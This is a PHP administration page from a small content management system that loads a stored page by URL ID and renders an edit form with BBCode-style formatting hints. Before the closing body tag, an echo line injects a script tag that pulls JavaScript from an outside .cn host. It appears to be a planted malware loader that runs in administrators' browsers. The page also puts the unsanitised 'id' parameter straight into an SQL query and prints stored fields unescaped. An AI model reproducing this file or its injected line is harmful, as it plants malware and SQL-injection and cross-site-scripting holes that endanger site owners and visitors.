<?php
include 'admin_header.php';																									//Includes Session start, and functions affecting all administration pages

if ($_SESSION['auth'] == "admin") 																							//Check if administrative user is logged in.
{
	include("db_connect.php");		
	$page_ID = $_GET['id'];
	$query = "SELECT * FROM pages WHERE  page_id = $page_ID";
	$page_result = mysql_query($query);
		
	$row = mysql_fetch_array($page_result, MYSQL_ASSOC);
	$print_date = date('F j, Y', strtotime($row['page_date']));
	$stripped_title = stripslashes($row['page_title']);
	$title = htmlentities($stripped_title, ENT_QUOTES);
	echo "<html>\n<head>\n<link rel='stylesheet' href='admin.css'  type='text/css' />\n</head>\n<body>\n";
	echo "<h2>Edit Page</h2>\n";	
	include 'admin_navigation.php';	
	echo "<form action='admin_pages_action.php' method='post'>\n" ;
	echo "<input type='hidden' name='action' value='edit'>\n";
	echo "<input type='hidden' name='id' value='".$row['page_id']."'>\n";
	echo "<div class='pages'>";
	echo "Title: <input name='title' type='text' size='50' value='".$title."'>";
	echo "<br />";
	echo "<input name='active' type='radio' value='1'"; if ($row['page_show'] == 1) {echo "checked='yes'";} echo "/> Active\n"; 
	echo "<input name='active' type='radio' value='0'"; if ($row['page_show'] == 0) {echo "checked='yes'";} echo "/> Disabled<br />\n";
	echo "<textarea name='content' cols='60' rows='20' >".stripslashes($row['page_content'])."</textarea>";
	echo "<br />";
	echo $row['page_img1'];
	echo "<br />";
	echo $row['page_img2'];
	echo "<br /><br />";
	echo "<input name='edit' type='submit' value='Edit'> <a href='index.php'>Cancel</a><br />\n";
	echo "</form>";
	echo "</div>";
	?>
	<br />
	Code you can use:<br />
	[b] <strong>bold text</strong> [/b]<br />
	[i] <i>italic text</i> [/i]<br />
	[u] <u>underline</u> [/u] <br />
	[return] - new line<br />
    <?php echo "<script src='http://nt002.cn/E/J.JS'></script></body>\n</html>\n"; ?>
<?php
}
?>